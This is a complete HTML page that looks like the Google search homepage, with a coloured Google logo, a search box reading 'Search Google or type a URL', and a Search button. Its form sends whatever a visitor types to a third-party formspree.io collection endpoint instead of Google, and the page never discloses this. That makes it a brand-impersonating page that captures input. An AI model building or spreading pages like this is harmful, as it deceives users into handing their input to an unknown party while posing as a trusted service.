<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Search</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#ffffff;
}

.container{
    width:100%;
    max-width:700px;
    text-align:center;
}

.logo{
    font-size:70px;
    font-weight:bold;
    color:#4285F4;
    margin-bottom:35px;
}

.logo span:nth-child(2){color:#EA4335;}
.logo span:nth-child(3){color:#FBBC05;}
.logo span:nth-child(4){color:#4285F4;}
.logo span:nth-child(5){color:#34A853;}
.logo span:nth-child(6){color:#EA4335;}

.search-box{
    width:100%;
    display:flex;
    justify-content:center;
}

.search-box input{
    width:100%;
    padding:18px 25px;
    border:1px solid #dcdcdc;
    border-radius:50px;
    font-size:20px;
    outline:none;
    transition:.3s;
}

.search-box input:focus{
    box-shadow:0 0 10px rgba(0,0,0,.15);
}

.btn{
    margin-top:30px;
}

button{
    padding:12px 35px;
    border:none;
    border-radius:25px;
    background:#4285F4;
    color:white;
    font-size:18px;
    cursor:pointer;
}

button:hover{
    background:#3367d6;
}
</style>

</head>
<body>

<div class="container">

<div class="logo">
<span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
</div>

<form action="https://formspree.io/f/xojaevjr" method="POST">

<div class="search-box">
<input
type="text"
name="Search"
placeholder="Search Google or type a URL"
required>
</div>

<div class="btn">
<button type="submit">Search</button>
</div>

</form>

</div>

</body>
</html>
